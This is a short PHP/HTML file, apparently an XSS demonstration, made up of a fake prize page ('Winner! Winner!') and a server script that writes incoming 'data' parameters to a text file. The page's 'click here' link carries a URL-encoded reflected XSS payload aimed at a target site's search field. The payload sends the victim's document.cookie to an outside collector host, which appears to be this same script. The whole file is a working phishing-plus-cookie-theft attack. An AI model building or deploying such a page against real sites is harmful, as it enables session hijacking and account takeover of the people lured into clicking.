<?php

if(isset($_GET) && $_GET['data']){
  $myfile = fopen("dumpdata.txt", "w") or die("Unable to open file!");
  fwrite($myfile, "\n\n" . date("Y-m-d H:i:s") . " : " .$_GET['data']);
  fclose($myfile);
}

?>
<!DOCTYPE html>
<html>

<head>
  <style>
    body {
      background-color: #cccccc;
    }

    h1 {
      background-color: #21b26a;
    }
  </style>
  <title>Get a free juice!</title>
</head>

<body>
  <center>
    <h1>Winner! Winner!</h1>
    <p> Lucky winner! You won a free cash voucher in your account! Just <a
        href="
        https://vulnerable-to-hack.herokuapp.com/fixed-web/index.php?search=%3Cimg%20src%3D%22x%22%20onerror%3D%22javascript%3Avar%20xmlHttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20%0AxmlHttp.open%28%20%27GET%27%2C%20%27https%3A%2F%2Fmalicious-web.herokuapp.com%2Findex.php%3Fdata%3D%27%2Bdocument.cookie%2C%20false%20%29%3B%20xmlHttp.send%28%20null%20%29%3B%22%3E
        ">click
        here</a> to claim! </p>
  </center>
</body>

</html>